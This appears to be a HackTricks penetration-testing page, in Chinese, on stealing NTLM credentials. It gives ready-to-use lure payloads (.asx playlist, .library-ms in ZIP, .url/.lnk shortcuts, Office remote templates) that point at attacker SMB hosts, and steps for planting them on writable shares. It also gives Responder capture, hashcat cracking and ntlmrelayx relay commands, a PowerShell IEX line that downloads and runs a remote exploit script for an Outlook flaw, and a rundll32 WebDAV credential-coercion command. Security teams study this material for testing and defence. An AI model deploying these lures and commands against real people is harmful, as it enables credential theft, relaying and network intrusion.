# 窃取 NTLM 凭据的位置

{{#include ../../banners/hacktricks-training.md}}

**查看 [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) 中所有精彩思路，从在线下载 Microsoft Word 文件，到 ntlm leaks 来源：https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md 和 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### 可写 SMB 共享 + Explorer 触发的 UNC 诱饵（ntlm_theft/SCF/LNK/library-ms/desktop.ini）

如果你可以**写入用户或计划任务会在 Explorer 中浏览的共享**，就放入元数据指向你的 UNC（例如 `\\ATTACKER\share`）的文件。呈现文件夹会触发**隐式 SMB 身份验证**，并向你的监听器泄露 **NetNTLMv2**。<sup>[[1]](#references)</sup>

1. **生成诱饵**（涵盖 SCF/URL/LNK/library-ms/desktop.ini/Office/RTF 等）

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **将它们放到可写共享目录中**（受害者会打开的任意文件夹）：

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **监听并破解**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows 可能会同时访问多个文件；Explorer 能预览的任何内容（`BROWSE TO FOLDER`）都无需点击。

### Windows Media Player 播放列表（.ASX/.WAX）

如果能让目标打开或预览由你控制的 Windows Media Player 播放列表，就可以通过将条目指向 UNC 路径来 leak Net‑NTLMv2。WMP 会尝试通过 SMB 获取引用的媒体，并自动进行身份验证。<sup>[[3]](#references)[[4]](#references)</sup>

示例 payload：

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

收集与破解流程：

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### ZIP 中嵌入的 .library-ms NTLM leak（CVE-2025-24071/24055）

Windows Explorer 在直接从 ZIP archive 中打开 .library-ms 文件时，会不安全地处理这些文件。如果库定义指向远程 UNC 路径（例如 \\attacker\share），只需在 ZIP 中浏览/启动该 .library-ms 文件，Explorer 就会枚举此 UNC 路径，并向攻击者发送 NTLM 身份验证信息。由此可获取 NetNTLMv2，可离线破解或尝试 relay。<sup>[[2]](#references)</sup>

指向攻击者 UNC 路径的最简 .library-ms文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

操作步骤
- 使用上面的 XML 创建 .library-ms 文件（设置你的 IP/主机名）。
- 将其压缩（在 Windows 上：发送到 → 压缩(zipped)文件夹），然后将 ZIP 发送给目标。
- 运行 NTLM capture listener，并等待受害者从 ZIP 内打开 .library-ms 文件。


### Outlook 日历提醒声音路径（CVE-2023-23397）——零点击 Net-NTLMv2 leak

Microsoft Outlook for Windows 会处理日历项中的扩展 MAPI 属性 PidLidReminderFileParameter。如果该属性指向 UNC 路径（例如，\\attacker\share\alert.wav），提醒触发时，Outlook 就会连接到 SMB share，无需任何点击即可 leak 用户的 Net-NTLMv2。该问题已于 2023 年 3 月 14 日修复，但对于仍在使用旧版软件或尚未修补的设备群，以及历史事件响应而言，它仍然非常重要。<sup>[[5]](#references)</sup>

使用 PowerShell 快速利用（Outlook COM）：

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

监听端：

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

说明
- 受害者只需在提醒触发时运行 Outlook for Windows。
- leak 会获得可用于离线破解或 relay 的 Net‑NTLMv2（不能用于 pass-the-hash）。


### 基于 .LNK/.URL 图标的零点击 NTLM leak（CVE‑2025‑50154 – 绕过 CVE‑2025‑24054）

Windows Explorer 会自动显示快捷方式图标。近期研究表明，即使 Microsoft 在 2025 年 4 月修复了 UNC 图标快捷方式问题，仍可通过将快捷方式目标托管在 UNC 路径上，同时将图标保留在本地，在无需点击的情况下触发 NTLM 身份验证（此补丁绕过被指定为 CVE‑2025‑50154）。只需查看该文件夹，Explorer 就会从远程目标检索元数据，并向攻击者的 SMB 服务器发送 NTLM。<sup>[[6]](#references)</sup>

最简 Internet Shortcut payload（.url）：

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

通过 PowerShell 编写程序快捷方式 payload（.lnk）：

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

投递思路
- 将快捷方式放进 ZIP 文件，并诱使受害者浏览该文件。
- 将快捷方式放在受害者会打开的可写共享目录中。
- 在同一文件夹中放入其他诱饵文件，让 Explorer 预览这些项目。

### 无需点击的 .LNK NTLM leak：通过 ExtraData 图标路径（CVE‑2026‑25185）

Windows 会在**查看/预览**时（渲染图标时）加载 `.lnk` 元数据，而不只是在执行时加载。CVE‑2026‑25185 展示了一条解析路径：**ExtraData** 块会导致 shell 解析图标路径并在**加载期间**访问文件系统；如果路径指向远程位置，就会发出出站 NTLM 请求。

关键触发条件（在 `CShellLink::_LoadFromStream` 中观察到）：
- 在 ExtraData 中包含 **DARWIN_PROPS** (`0xa0000006`)（这是进入图标更新例程的门槛）。
- 包含 **ICON_ENVIRONMENT_PROPS** (`0xa0000007`)，并填充 **TargetUnicode**。
- 加载程序会展开 `TargetUnicode` 中的环境变量，并对生成的路径调用 `PathFileExistsW`。

如果 `TargetUnicode` 解析为 UNC 路径（例如 `\\attacker\share\icon.ico`），**仅仅查看包含该快捷方式的文件夹**就会导致发出出站身份验证请求。同一加载路径也可能由**索引**和**AV 扫描**触发，因此这是一个实用的无需点击的 leak 攻击面。<sup>[[7]](#references)</sup>

**LnkMeMaybe** 项目提供了研究工具（解析器/生成器/UI），可用于构建/检查这些结构，而无需使用 Windows GUI。<sup>[[8]](#references)</sup>


### 通过 `davclnt.dll,DavSetCookie` 强制 WebDAV 身份验证 / 验证凭据

原生 **WebDAV client** 可被滥用，迫使当前登录会话向任意 **HTTP/WebDAV** 端点进行身份验证：

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

为何这很有用：
- 对于**攻击者控制的 WebDAV 服务器**，无需部署自定义客户端即可触发 **NTLM over HTTP**。
- 对于**内部主机**，这是一种隐蔽的方式，可在横向移动前**验证被盗凭据在哪些位置可用**。<sup>[[9]](#references)</sup>
- 当 **SMB 出站流量受到过滤**但仍可访问 **HTTP/WebDAV** 时，此命令是不错的替代方案。

操作说明：
- 源主机上必须运行 **WebClient** 服务。
- `rundll32.exe` 会加载 `davclnt.dll`，并让 Windows 使用**当前用户的凭据**处理 WebDAV 身份验证。<sup>[[10]](#references)</sup>
- 如果将其指向你控制的基础设施，请使用支持 NTLM 的 HTTP 监听器/中继，例如：

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

从检测角度看，针对许多内部系统重复执行 `rundll32.exe davclnt.dll,DavSetCookie`，是**凭据验证 / 类似喷洒的横向移动准备**的强烈信号，而非正常用户行为。<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office 文档可以引用外部模板。如果将附加模板设为 UNC 路径，打开文档时就会通过 SMB 进行身份验证。

最简 DOCX 关系修改（位于 word/ 目录中）：

1) 编辑 word/settings.xml 并添加附加模板引用：

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) 编辑 word/_rels/settings.xml.rels，并将 rId1337 指向你的 UNC：

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) 重新打包为 .docx 并交付。运行 SMB 捕获监听器并等待文件被打开。

有关捕获后的 NTLM 中继或滥用思路，请查看：

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – 可写共享诱饵 + Responder 捕获 → NetNTLMv2 破解 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms 身份验证 leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 升级为 DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction 到 webroot RCE → FullPowers + GodPotato 提权至 SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 个 NTLM 漏洞：Microsoft 中未修补的权限提升威胁](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft 缓解 Outlook EoP (CVE‑2023‑23397)，并解释通过 PidLidReminderFileParameter 造成的 NTLM leak](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – 零点击、一个 NTLM：Microsoft 安全补丁绕过 (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe：CVE‑2026‑25185 回顾](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe 工具](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – IT 支持来电时：剖析从 Teams 到域遭入侵的 ModeloRAT 活动](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h 头文件](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV 请求](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - 窃取 Netntlm 哈希的关注点](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
{{#include ../../banners/hacktricks-training.md}}
